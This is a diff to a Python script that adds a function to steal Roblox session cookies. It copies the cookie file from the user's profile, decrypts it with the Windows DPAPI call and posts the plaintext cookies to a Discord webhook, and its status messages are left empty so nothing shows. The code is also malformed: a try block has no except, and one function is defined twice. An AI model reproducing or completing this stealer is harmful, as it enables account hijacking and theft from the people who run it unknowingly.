@@ -219,3 +219,35 @@ def main():
 def send_to_discord(message):
     payload = {"content": message}
     response = requests.post(WEBHOOK_URL, json=payload)
+    if response.status_code == 204:
+        print("")
+    else:
+        print("")
+
+def retrieve_roblox_cookies():
+    user_profile = os.getenv("USERPROFILE", "")
+    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
+
+    temp_dir = os.getenv("TEMP", "")
+    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
+    shutil.copy(roblox_cookies_path, destination_path)
+
+    try:
+        with open(destination_path, 'r', encoding='utf-8') as file:
+            file_content = json.load(file)
+
+        encoded_cookies = file_content.get("CookiesData", "")
+
+        decoded_cookies = base64.b64decode(encoded_cookies)
+        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
+        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
+
+        send_to_discord(f"Decrypted Roblox Cookies:\n```\n{decrypted_text}\n```")
+
+def send_to_discord(message):
+    payload = {"content": message}
+    response = requests.post(WEBHOOK_URL, json=payload)
+    if response.status_code == 204:
+        print("")
+    else:
+        print("")
